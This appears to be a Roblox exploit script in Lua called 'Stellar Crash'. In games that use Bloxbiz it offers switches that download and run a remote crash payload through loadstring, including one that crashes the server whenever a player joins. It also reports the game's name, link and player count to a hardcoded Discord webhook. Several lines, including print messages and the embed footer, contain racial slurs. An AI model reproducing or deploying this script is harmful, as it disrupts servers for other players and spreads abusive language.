local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/memejames/elerium-v2-ui-library//main/Library", true))()

local url = "https://discord.com/api/webhooks/1307723020432834640/K-pppghjYlgavh-GFafXohTdendDSQO33R2BxCTfIOuxdV0CNz0ZNh6t48714qUcDtmx"

local frames = 0
local fps = 0
local lastUpdateTime = tick()

local guiName = "StellarCum"

local CoreGui = game:GetService("CoreGui")

if not CoreGui:FindFirstChild(guiName) then
   
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = guiName  

    
    screenGui.Parent = CoreGui

    print("Stellar Crash has been loaded")
else
   
    print("Stellar is already loaded nigger")
    return
end

-- Create a TextLabel to display FPS on the screen
local player = Players.LocalPlayer



local screenGui = Instance.new("ScreenGui")
screenGui.Name = "FPSDisplay"
screenGui.ResetOnSpawn = false -- Keep GUI persistent after respawn
screenGui.Parent = CoreGui -- Parent it to CoreGui

-- Create the main frame for styling
local TweenService = game:GetService("TweenService")  -- Add TweenService to animate the RGB effect

-- Create the main frame for styling
local displayFrame = Instance.new("Frame")
displayFrame.Name = "DisplayFrame"
displayFrame.Visible = false
displayFrame.Size = UDim2.new(0, 220, 0, 60) -- Adjust for FPS and Ping
displayFrame.Position = UDim2.new(0, 10, 0, 10) -- Top-left corner
displayFrame.BackgroundTransparency = 0.2
displayFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25) -- Dark gray
displayFrame.BorderSizePixel = 2
displayFrame.BorderColor3 = Color3.fromRGB(255, 255, 255) -- Light blue border (will be animated to RGB)
displayFrame.Parent = screenGui

-- Add a UI corner for rounded edges
local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 10) -- Rounded corners
uiCorner.Parent = displayFrame

-- Add a UIStroke for RGB border effect
local uiStroke = Instance.new("UIStroke")
uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
uiStroke.Thickness = 2 -- Set border thickness
uiStroke.Parent = displayFrame

-- Function to create RGB color tween

-- Create a label for the FPS text
local fpsLabel = Instance.new("TextLabel")
fpsLabel.Name = "FPSLabel"
fpsLabel.Size = UDim2.new(1, -20, 0.5, -10) -- Top half for FPS
fpsLabel.Position = UDim2.new(0, 10, 0, 10) -- Padding inside the frame
fpsLabel.BackgroundTransparency = 1 -- No background for the label
fpsLabel.TextColor3 = Color3.fromRGB(200, 200, 200) -- Gray text
fpsLabel.Font = Enum.Font.Gotham -- Sleek modern font
fpsLabel.TextSize = 16 -- Larger, clean text size
fpsLabel.TextXAlignment = Enum.TextXAlignment.Center -- Center horizontally
fpsLabel.TextYAlignment = Enum.TextYAlignment.Center -- Center vertically
fpsLabel.Text = "FPS: 0"
fpsLabel.Parent = displayFrame

-- Create a label for the Ping text
local pingLabel = Instance.new("TextLabel")
pingLabel.Name = "PingLabel"
pingLabel.Size = UDim2.new(1, -20, 0.5, -10) -- Bottom half for Ping
pingLabel.Position = UDim2.new(0, 10, 0.5, 5) -- Below FPS
pingLabel.BackgroundTransparency = 1 -- No background for the label
pingLabel.TextColor3 = Color3.fromRGB(200, 200, 200) -- Gray text
pingLabel.Font = Enum.Font.Gotham -- Sleek modern font
pingLabel.TextSize = 16 -- Larger, clean text size
pingLabel.TextXAlignment = Enum.TextXAlignment.Center -- Center horizontally
pingLabel.TextYAlignment = Enum.TextYAlignment.Center -- Center vertically
pingLabel.Text = "Ping: 0ms"
pingLabel.Parent = displayFrame

if not game:IsLoaded() then
    game.Loaded:wait()
end




-- Function to check if the game contains "Bloxbiz"
local function checkForBloxbiz()
    for _, item in ipairs(ReplicatedStorage:GetDescendants()) do
        if item.Name:lower():find("bloxbiz") then
            return true
        end
    end
    return false
end

function SendMessage(url, message)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["content"] = message
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
    print("Sent")
end

function SendMessageEMBED(url, embed)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["description"] = embed.description,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
                ["footer"] = {
                    ["text"] = embed.footer.text
                }
            }
        }
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
    print("Sent")
end

local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)

-- Get the game name and image URL
local gameName = gameInfo.Name
local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
local playerCount = #Players:GetPlayers()

local embed = {
    ["title"] = "Supported Game Found",
    ["description"] = "A supported game has been found!",
    ["color"] = 65280,
    ["fields"] = {
        {
            ["name"] = "Place Name",
            ["value"] = gameName
        },
        {
            ["name"] = "Place Link",
            ["value"] = gameLink
        },
       {
            ["name"] = "Active Players",
            ["value"] = tostring(playerCount)
        }
    },
    ["footer"] = {
        ["text"] = "Made by Lunar and he hates niggers"
}
}

-- Notify whether the game is supported
if checkForBloxbiz() then
    
local window = library:AddWindow("Stellar | Crasher", {
	main_color = Color3.fromRGB(200, 200, 200), -- Color
	min_size = Vector2.new(250, 250), -- Size of the gui
	can_resize = true, -- true or false
})

local Crasher = window:AddTab("Crasher")
Crasher:Show()

local Settings = window:AddTab("Settings")
Settings:Show()

-- SETTINGS TAB
Settings:AddLabel("Coming soon nigger")

-- Create the color picker UI element

-- CRASHER TAB
local fpsnping = Crasher:AddSwitch("Enable Fps/Ping", function(bool)
if bool then
displayFrame.Visible = true
else
displayFrame.Visible = false
end
end)
fpsnping:Set(true)

-- Create the switch button to enable/disable crasher
-- Declare a variable to control the loop


-- Crash Switch
local crashSwitch = Crasher:AddSwitch("Enable Crasher", function(bool)
    if bool then
        -- Try to execute the crash script
        local success, err = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/stellar-dv/stellar/refs/heads/main/semiuvcrasher.txt"))()
        end)

        if not success then
            StarterGui:SetCore("SendNotification", {
                Title = "Crasher Error",
                Text = "Failed to execute the crash script: " .. tostring(err),
                Duration = 5
            })
        else
            StarterGui:SetCore("SendNotification", {
                Title = "Crasher Enabled",
                Text = "The crasher has been activated.",
                Duration = 5
            })
        end
    else
        -- Disable functionality
        game:GetService("ReplicatedStorage").BloxbizRemotes.CatalogOnResetOutfit:FireServer()
        StarterGui:SetCore("SendNotification", {
            Title = "Crasher Disabled",
            Text = "The crasher has been turned off.",
            Duration = 5
        })
    end
end)

-- Default to disabled
crashSwitch:Set(false)

local crashOnJoin = false  -- Initialize the variable
local loadstringUrls = {
    "https://raw.githubusercontent.com/stellar-dv/stellar/refs/heads/main/semiuvcrasher.txt"
}
local currentUrlIndex = 1

local loopCrash = Crasher:AddSwitch("Enable Crash on Join", function(bool)
    crashOnJoin = bool  -- Set the crashOnJoin state based on the switch
    if crashOnJoin then
        print("Crash on join is enabled.")
    else
        print("Crash on join is disabled.")
    end
end)

loopCrash:Set(false)  -- Default to disabled

game.Players.PlayerAdded:Connect(function(player)
    StarterGui:SetCore("SendNotification", {
        Title = "New Player Joined",
        Text = player.Name .. " has joined the game!",
        Duration = 5
    })

    -- Check if the crashOnJoin flag is enabled
    if crashOnJoin then
wait(2)
        print("Crash triggered for " .. player.Name)

        -- Attempt to load and execute the crash script from a URL
        local success, err = pcall(function()
            loadstring(game:HttpGet(loadstringUrls[currentUrlIndex]))()
        end)

        if success then
            print('Script executed successfully')
        else
            warn("Failed to execute the script: " .. err)
        end

        -- Update the URL index for the next execution (alternates between 1 and 2)
        currentUrlIndex = (currentUrlIndex == 1) and 1 or 1
    end
end)

local isAntiCrashActive = false

local antiCrash = Crasher:AddSwitch("Enable Anticrash", function(bool)
    isAntiCrashActive = bool -- Set the state based on the switch

    if bool then
        -- Notify that AntiCrash has started
        StarterGui:SetCore("SendNotification", {
            Title = "Running AntiCrash",
            Text = "Accessories for all players are being removed continuously.",
            Duration = 5
        })

        -- Start a loop that runs while AntiCrash is active
        task.spawn(function()
            while isAntiCrashActive do
                for _, player in pairs(Players:GetPlayers()) do
                    local character = player.Character
                    if character then
                        for _, item in pairs(character:GetDescendants()) do
                            if item:IsA("Accessory") then
                                item:Destroy()
                            end
                        end
                    end
                end
                wait(0.5)
            end
        end)
    else StarterGui:SetCore("SendNotification", {
            Title = "AntiCrash Disabled",
            Text = "The anti-crash functionality has been turned off.",
            Duration = 5
        })
    end
end)

antiCrash:Set(false) 

StarterGui:SetCore("SendNotification", {
        Title = "Loaded ImGUI",
        Text = "ImGUI has been loaded...",
        Duration = 5
    })


StarterGui:SetCore("SendNotification", {
        Title = "Game Supported",
        Text = "This game is supported. Stellar Crash is initializing...",
        Duration = 5
    })

SendMessageEMBED(url, embed)
else
    StarterGui:SetCore("SendNotification", {
        Title = "Game Not Supported",
        Text = "This game is not supported. No scripts will execute.",
        Duration = 5
    })
    return -- Stop execution if the game is unsupported
end



RunService.RenderStepped:Connect(function()
    frames = frames + 1

    -- Update FPS every 0.1 seconds
    if tick() - lastUpdateTime >= 0.1 then
        fps = frames / (tick() - lastUpdateTime)  -- FPS calculation for 0.1s window
        frames = 0
        lastUpdateTime = tick()

        -- Update FPS display
        fpsLabel.Text = "FPS: " .. tostring(math.floor(fps))

local ping = math.floor(Players.LocalPlayer:GetNetworkPing() * 1000) -- Convert seconds to ms
        pingLabel.Text = "Ping: " .. tostring(ping) .. "ms"

end
end)


Players.PlayerRemoving:Connect(function(player)
    StarterGui:SetCore("SendNotification", {
        Title = "A Player Left",
        Text = player.Name .. " just left the server :clown:",
        Duration = 5
    })


end)
